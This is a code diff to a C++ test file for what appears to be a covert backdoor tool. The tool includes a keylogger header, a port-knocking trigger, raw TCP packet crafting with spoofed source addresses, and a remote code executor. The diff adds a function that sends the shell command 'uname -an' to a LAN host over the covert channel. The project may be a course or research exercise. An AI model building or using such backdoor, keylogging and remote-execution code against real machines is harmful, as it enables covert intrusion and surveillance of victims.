@@ -14,6 +14,7 @@
 #include "Keylogger.h"
 
 const std::string interfaceName("eno1");
+// const std::string interfaceName("wlp59s0");
 const std::string knockPattern("8000,8001,8002");
 const std::string key("key");
 
@@ -47,14 +48,17 @@ void testNet() {
     struct in_addr dstAddr;
     srcAddr.s_addr = 0xDEADBEEF;
     dstAddr.s_addr = 0xEFBEADDE;
+    unsigned int seq = Crypto::rand();
+    unsigned int ack = Crypto::rand();
 
     NetworkEngine netEngine(interfaceName, key, knockPattern, knockPort, knockDuration);
 
     // tcp sending examples
     for (int i = 0; i < 10; i++) {
-        std::cout << netEngine.sendRawTcp(srcAddr, dstAddr, sport, dport, TcpStack::SYN_FLAG, data)
+        std::cout << netEngine.sendRawTcp(srcAddr, dstAddr, sport, dport, TcpStack::SYN_FLAG, seq,
+                                          ack, data)
                   << std::endl;
-        std::cout << netEngine.sendRawTcp(srcAddr, dstAddr, sport, dport,
+        std::cout << netEngine.sendRawTcp(srcAddr, dstAddr, sport, dport, seq, ack,
                                           TcpStack::SYN_FLAG | TcpStack::ACK_FLAG, data)
                   << std::endl;
     }
@@ -92,7 +96,7 @@ void testKnock() {
 
 void testRce() {
     struct in_addr daddr;
-    daddr.s_addr = 0xc0a80011;
+    daddr.s_addr = 0xc0a80166;
 
     NetworkEngine netEngine(interfaceName, key, knockPattern, knockPort, knockDuration);
 
@@ -106,6 +110,15 @@ void testRce() {
     netEngine.stopSniff();
 }
 
+void testRceRes() {
+    struct in_addr daddr;
+    daddr.s_addr = 0xc0a80166;
+
+    NetworkEngine netEngine(interfaceName, key, knockPattern, knockPort, knockDuration);
+
+    RemoteCodeExecuter::executeCommand(&netEngine, daddr.s_addr, "uname -an");
+}
+
 int main(int argc, char *argv[]) {
 
     // testAuth();
@@ -114,6 +127,7 @@ int main(int argc, char *argv[]) {
     // testNet();
     // testKnock();
     testRce();
+    // testRceRes();
 
     return 0;
 }
